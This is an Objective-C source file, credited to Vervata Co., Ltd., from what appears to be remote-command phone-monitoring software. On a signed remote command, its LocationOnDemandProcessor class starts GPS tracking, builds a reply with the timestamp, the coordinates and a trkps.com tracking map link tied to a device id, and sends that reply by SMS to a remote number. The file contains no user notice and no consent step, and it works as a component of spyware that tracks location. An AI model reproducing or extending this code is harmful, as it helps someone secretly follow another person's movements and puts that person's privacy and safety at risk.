/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  LocationOnDemandProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  21/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "LocationOnDemandProcessor.h"
#import "LocationManagerImpl.h"
#import "FxLocationEvent.h"
#import "LocationManagerImpl.h"
#import "Preference.h"
#import "PrefLocation.h"

@interface LocationOnDemandProcessor (PrivateAPI)
- (void) acknowldgeMessage;
-(void) processFinished;
- (void) sendReplySMS:(NSString *) aReplyMessage isProcessCompleted:(BOOL) aIsComplete; 
- (void) processOnDemandLocation;
- (NSString *) formattedDateTime: (NSString *) aDateTime;
@end

@implementation LocationOnDemandProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the LocationOnDemandProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"LocationOnDemandProcessor--->initWithRemoteCommandData");
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
    DLog (@"LocationOnDemandProcessor--->doProcessingCommand");

	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"LocationOnDemandProcessor"
												  reason:@"Failed signature check"];
	}
	
	[self processOnDemandLocation];	
}


#pragma mark LocationOnDemandProcessor Private Mehods

/**
 - Method name: processOnDemandLocation
 - Purpose:This method is used to process OnDemandLocation
 - Argument list and description: No argument
 - Return description:No return type
 */

- (void) processOnDemandLocation {
	DLog (@"LocationOnDemandProcessor--->doProcessingCommand");
	[self acknowldgeMessage];	
	
	if (![CLLocationManager locationServicesEnabled]) {
		[self performSelector:@selector(acknowldgeMessageLocationServiceDisabled) withObject:nil afterDelay:3];
	} else {		
		mlocManagerImpl=[[LocationManagerImpl alloc]init];
		[mlocManagerImpl setMEventDelegate:[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate]];
		[mlocManagerImpl setMAppContext:[[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext]];
		[mlocManagerImpl setMLocationManagerDelegate:self];
		[mlocManagerImpl setMIntervalTime:60];				// 1 minute will go to tracking mode
		[mlocManagerImpl setMCallingModule:kGPSCallingModuleRemoteCommand];
		[mlocManagerImpl startTracking];		
	}
}

/**
 - Method name: acknowldgeMessage
 - Purpose:		This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:				No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kOnDemandLocation", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: acknowldgeMessageLocationServiceDisabled
 - Purpose:		This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:				No Return
 */

- (void) acknowldgeMessageLocationServiceDisabled {
	DLog (@"On Demand Location: location service is disbled")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:kLocationServiceDisabled];
	[self sendReplySMS:messageFormat isProcessCompleted:YES];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"LocationOnDemandProcessor--->sendReplySMS");
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	}
	else {
		DLog (@"Sent aknowldge message.")
	}
}


/**
 - Method name: processFinished
 - Purpose:This method is invoked when Activate Process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"LocationOnDemandProcessor--->processFinished");
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

- (NSString *) formattedDateTime: (NSString *) aDateTime {
	// input format yyyy-MM-dd HH:mm:ss
	// output format dd/mm/yyyy hh:mm
	
	NSArray *dateTimeArray = [NSArray array];
	dateTimeArray = [aDateTime componentsSeparatedByString:@" "];
	DLog(@"date: %@, time: %@", [dateTimeArray objectAtIndex:0], [dateTimeArray objectAtIndex:1])
	NSArray *dateArray = [[dateTimeArray objectAtIndex:0] componentsSeparatedByString:@"-"];
	DLog(@"date array: %@", dateArray)
	NSArray *timeArray = [[dateTimeArray objectAtIndex:1] componentsSeparatedByString:@":"];		
	DLog(@"time array: %@", timeArray)	
	NSMutableString *formattedDateTimeString = [NSMutableString string];
	[formattedDateTimeString appendFormat:@"%@/%@/%@ %@:%@",
	 [dateArray objectAtIndex:2],
	 [dateArray objectAtIndex:1],
	 [dateArray objectAtIndex:0],
	 [timeArray objectAtIndex:0],
	 [timeArray objectAtIndex:1]];
	return [NSString stringWithString:formattedDateTimeString];
	
}

#pragma mark LocationManagerDelegate methods

/**
 - Method name: updateCurrentLocation
 - Purpose:This method is used to when location is captured
 - Argument list and description: aLocationEvent (FxLocationEvent)
 - Return description: No return type
 */

- (void) updateCurrentLocation: (FxLocationEvent *) aLocationEvent {
	
	DLog (@"LocationOnDemandProcessor--->updateCurrentLocation");
	[mlocManagerImpl stopTracking];
	//For Date
	NSString *dateString=NSLocalizedString(@"kDate", @"");
	//dateString=[dateString stringByAppendingString:[aLocationEvent dateTime]];
	dateString=[dateString stringByAppendingString:[self formattedDateTime:[aLocationEvent dateTime]]];
	
	//For Cordinates
	NSString *coordinatesString = NSLocalizedString(@"kCoordinates", @"");
	
	coordinatesString= [NSString stringWithFormat:@"%@%lf,%lf,",
						coordinatesString,[aLocationEvent latitude],[aLocationEvent longitude]];
	//For Map URL
//	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
//	PrefLocation *prefLocation = (PrefLocation *)[prefManager preference:kLocation];
	NSString *mapURL=[NSString stringWithFormat:@"http://trkps.com/m.php?lat=%lf&long=%lf&a=%lf&i=3520220005602477&z=5",
					  [aLocationEvent latitude],[aLocationEvent longitude],[aLocationEvent altitude]];
	
	
	coordinatesString= [coordinatesString stringByAppendingString:mapURL];
	
	//For Positioning type
	NSString *tecTypeString=NSLocalizedString(@"kGPSTechString", @"");
	DLog (@"aLocationEvent.method %d", aLocationEvent.method)
	switch (aLocationEvent.method) {
		case kGPSTechUnknown:
			tecTypeString=[tecTypeString stringByAppendingString:@"Unknown"];
			break;
		case kGPSTechIntegrated:
		case kGPSTechAssisted:
			tecTypeString=[tecTypeString stringByAppendingString:NSLocalizedString(@"kGPSTechStringSatellite", @"")];
			break;
		case kGPSTechWifi:
			tecTypeString=[tecTypeString stringByAppendingString:NSLocalizedString(@"kGPSTechStringWifi", @"")];
			break;
		case kGPSTechCellular:
		case kGPSTechNetworkBased:	
			tecTypeString=[tecTypeString stringByAppendingString:NSLocalizedString(@"kGPSTechStringNetwork", @"")];
			break;
		default:
			break;
	}
	DLog (@"tecTypeString %@",tecTypeString)
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *locationOnDemandMessage=[NSString stringWithFormat:@"%@%@\n%@\n%@",messageFormat,tecTypeString,dateString,coordinatesString];
	[self sendReplySMS:locationOnDemandMessage isProcessCompleted:YES];	
}

/**
 - Method name: trackingError
 - Purpose:This method is used to when location tracking is failed
 - Argument list and description: aError (NSError)
 - Return description: No return type
 */

- (void) trackingError: (NSError *) aError {
	DLog (@"LocationOnDemandProcessor--->trackingError");
	[mlocManagerImpl stopTracking];
	NSString *locationOnDemandMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																								  andErrorCode:kLocationError];
	[self sendReplySMS:locationOnDemandMessage isProcessCompleted:YES];
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	DLog (@"dealloc of location on demand")
	[mlocManagerImpl release];
	mlocManagerImpl=nil;
	[super dealloc];
}


@end
